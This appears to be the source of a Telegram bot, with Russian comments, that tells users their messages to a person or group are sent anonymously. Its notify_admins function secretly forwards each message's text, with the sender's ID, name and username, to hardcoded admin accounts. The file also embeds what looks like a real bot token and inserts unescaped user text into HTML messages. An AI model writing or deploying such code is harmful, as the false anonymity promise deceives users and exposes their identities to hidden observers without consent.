import asyncio
import sqlite3
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.client.default import DefaultBotProperties

# --- ТВОИ ДАННЫЕ (НЕ ЗАБУДЬ ID ГРУППЫ!) ---
TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
ADMIN_IDS = [7919798306, 5275461907]
GROUP_ID = -1003784828350  # <--- ВСТАВЬ СЮДА ID ГРУППЫ ИЗ @getmyid_bot

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

@dp.message(CommandStart())
async def start(message: types.Message):
    args = message.text.split()
    
    # 1. Если перешли по ссылке для ГРУППЫ (?start=group)
    if len(args) > 1 and args[1] == "group":
        await message.answer(
            "📢 <b>Режим отправки в группу</b>\n\nНапиши сообщение ниже, и я опубликую его анонимно в нашей группе!\n\n(Обязательно нажми на это сообщение и выбери <b>'Ответить'</b>)"
        )
    
    # 2. Если перешли по ЛИЧНОЙ ссылке (?start=12345)
    elif len(args) > 1 and args[1].isdigit():
        target = args[1]
        await message.answer(f"🤫 Пиши анонимно для пользователя <code>{target}</code>\n\n(Нажми на это сообщение и выбери <b>'Ответить'</b>)")
    
    # 3. Обычный старт (создание своей ссылки)
    else:
        init_db()
        bot_user = await bot.get_me()
        my_link = f"https://t.me/{bot_user.username}?start={message.from_user.id}"
        group_link = f"https://t.me/{bot_user.username}?start=group"
        
        text = (
            f"👋 <b>Твои ссылки:</b>\n\n"
            f"👤 <b>Для личных вопросов:</b>\n<code>{my_link}</code>\n\n"
            f"📢 <b>Для вопросов в группу (закрепи её там):</b>\n<code>{group_link}</code>"
        )
        await message.answer(text)

@dp.message(F.text)
async def handle_messages(message: types.Message):
    if not message.reply_to_message:
        return

    # ПРОВЕРЯЕМ: Опубликовать в ГРУППУ
    if "опубликую его анонимно в нашей группе" in message.reply_to_message.text:
        try:
            await bot.send_message(GROUP_ID, f"📥 <b>Новое анонимное сообщение:</b>\n\n{message.text}")
            await message.answer("✅ Твой вопрос опубликован в группе!")
            await notify_admins(message, "В ГРУППУ")
        except Exception as e:
            await message.answer(f"❌ Ошибка: проверь, есть ли бот в группе и админ ли он.")

    # ПРОВЕРЯЕМ: Отправить ЛИЧНО
    elif "Пиши анонимно для пользователя" in message.reply_to_message.text:
        try:
            target_id = re.findall(r'\d+', message.reply_to_message.text)[0]
            await bot.send_message(target_id, f"📥 <b>Новый анонимный вопрос:</b>\n\n{message.text}")
            await message.answer("✅ Доставлено лично!")
            await notify_admins(message, f"ЛИЧНО пользователю {target_id}")
        except:
            await message.answer("❌ Ошибка отправки.")

async def notify_admins(message, mode):
    u = message.from_user
    u_link = f"<a href='tg://user?id={u.id}'>{u.full_name}</a>"
    un = f" (@{u.username})" if u.username else ""
    log = f"🕵️ <b>ЛОГ</b>\n<b>От:</b> {u_link}{un}\n<b>Куда:</b> {mode}\n<b>Текст:</b> {message.text}"
    for admin in ADMIN_IDS:
        try: await bot.send_message(admin, log)
        except: pass

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

